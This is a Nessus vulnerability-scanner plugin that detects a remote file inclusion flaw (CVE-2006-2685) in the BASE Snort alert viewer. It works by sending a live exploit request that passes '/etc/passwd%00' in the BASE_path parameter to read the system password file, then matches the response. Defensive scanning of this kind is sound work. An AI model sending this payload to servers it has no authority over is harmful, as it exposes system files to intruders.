#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21611);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-2685");
  script_bugtraq_id(18298);
  script_xref(name:"EDB-ID", value:"1823");

  script_name(english:"BASE Multiple Script BASE_path Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file inclusion attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host fails to sanitize
input to the 'BASE_path' parameter before using it in PHP
include_once() function in several scripts.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts.");
  # http://sourceforge.net/project/shownotes.php?group_id=103348&release_id=422282
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dd74f480");
  script_set_attribute(attribute:"solution", value:
"Upgrade to BASE 1.2.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'BASE base_qry_common Remote File Include');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:secureideas:basic_analysis_and_security_engine");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/base_qry_common.php?",
      "BASE_path=", file ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/includes/base_signature.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      res = data_protection::redact_etc_passwd(output:res);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
